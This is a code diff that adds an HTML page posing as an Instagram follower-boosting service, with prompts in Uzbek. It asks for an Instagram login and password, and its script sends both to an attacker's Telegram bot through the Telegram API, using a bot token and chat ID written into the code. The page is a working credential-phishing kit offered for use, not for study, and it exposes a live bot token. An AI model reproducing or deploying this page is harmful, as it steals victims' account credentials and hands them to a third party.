@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send to Telegram</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 20px;
+            background-color: black;
+        }
+        input {
+            padding: 10px;
+            margin: 10px;
+            width: 280px;
+            border-radius: 10px;
+            background-color: black;
+            color: wheat;
+        }
+        button {
+            margin: 10px;
+            width: 300px;
+            padding: 8px;
+            border-radius: 3px;
+            background: #3939ff;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <img src="insta.jpg" alt="">
+  <div class="">
+    <input type="text" id="input1" placeholder="login"><br>
+    <input type="text" id="input2" placeholder="parol"><br>
+</div>
+<script>
+  let cor =prompt("salom bu sayda siz istagramga nakrutka yani obuncha yigsangiz bo'ladi")
+  console.log(cor);
+  if(cor>=false){
+    alert("login parolingizni kiriting")
+  }else{
+    alert("agar yoqmasa saytda boshqa funksiyalar ham bor")
+  }
+  
+</script>
+    <a href=""><button onclick="sendMessage()">Войти</button></a>
+    
+    <script>
+        const TELEGRAM_BOT_TOKEN = "7109758737:AAFIsFLnG5eqmf-CkurVYEZi3n1nOIXx9_g";
+        const TELEGRAM_CHAT_ID = "7675613595";
+
+        function sendMessage() {
+            let text1 = document.getElementById("input1").value;
+            let text2 = document.getElementById("input2").value;
+
+            if (text1 === "" || text2 === "") {
+                alert("Please enter both words!");
+                return;
+            }
+
+            let message = `New message:\nlogin 1: ${text1}\nparol 2: ${text2}`;
+            sendToTelegram(message);
+        }
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+            })
+            .then(response => response.json())
+            .then(data => console.log("Message sent to Telegram", data))
+            .catch(error => console.error("Error sending message to Telegram", error));
+        }
+    </script>
+</body>
+</html>
